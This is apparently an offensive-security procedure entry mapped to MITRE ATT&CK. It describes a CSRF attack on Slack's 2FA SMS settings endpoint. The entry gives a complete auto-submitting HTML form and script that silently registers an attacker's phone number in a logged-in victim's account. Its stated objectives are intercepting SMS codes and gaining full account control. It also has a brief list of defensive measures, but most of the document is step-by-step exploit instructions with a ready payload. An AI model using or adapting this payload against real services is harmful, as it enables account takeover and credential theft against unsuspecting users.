---
id: proc-slack-csrf-add-phone
tags:
  - csrf
  - 2fa
  - web-exploit
type: procedure
tools: []
tactics:
  - '[[Credential Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:29.564Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Auto-Submit-CSRF-Form-to-Add-Phone

## Summary

This procedure uses HTML and JavaScript to automatically submit a CSRF-vulnerable form to Slack's 2FA endpoint, adding the attacker's phone number without the required CSRF token.

## Description

Slack's /account/settings/2fa_sms endpoint fails to validate the 'crumb' CSRF token, allowing unauthenticated state changes. The malicious page loads a form that POSTs parameters like verify_two_factor=1, country_code=AU, phone_number=█████████ (redacted attacker number), triggering an SMS code to the attacker. This occurs in the victim's authenticated session via drive-by compromise.

## Requirements

1. Victim's browser session active on Slack
2. Malicious HTML form prepared with attacker's phone details
3. No crumb parameter included to exploit the flaw

## Defense

Defensive measures and detection strategies:

- Implement and enforce CSRF tokens on all POST endpoints
- Rate-limit 2FA additions and log anomalous phone updates
- Use Content-Security-Policy to block inline/auto-submits
- Audit session for unexpected form submissions

## Objectives

1. Add secondary 2FA phone covertly
2. Trigger SMS to attacker for code interception
3. Enable subsequent verification for full control

## Instructions

### Step 1: Prepare the HTML Form

**Context**: Embed the form in slackcsrf.html to auto-submit on load.

HTML snippet:
<form id="addPhone" action="https://cs-sa.slack.com/account/settings/2fa_sms" method="POST">
<input type="hidden" name="verify_two_factor" value="1">
<input type="hidden" name="country_code" value="AU">
<input type="hidden" name="phone_number" value="█████████">
</form>
<script>document.getElementById('addPhone').submit();</script>

> Form submits immediately, exploiting missing validation.

### Step 2: Host and Trigger

**Context**: Serve the page; victim's click loads and executes.

No command; monitor for POST request success.

> Expected: SMS arrives at attacker's phone.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access]] Credential Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[2fa]]
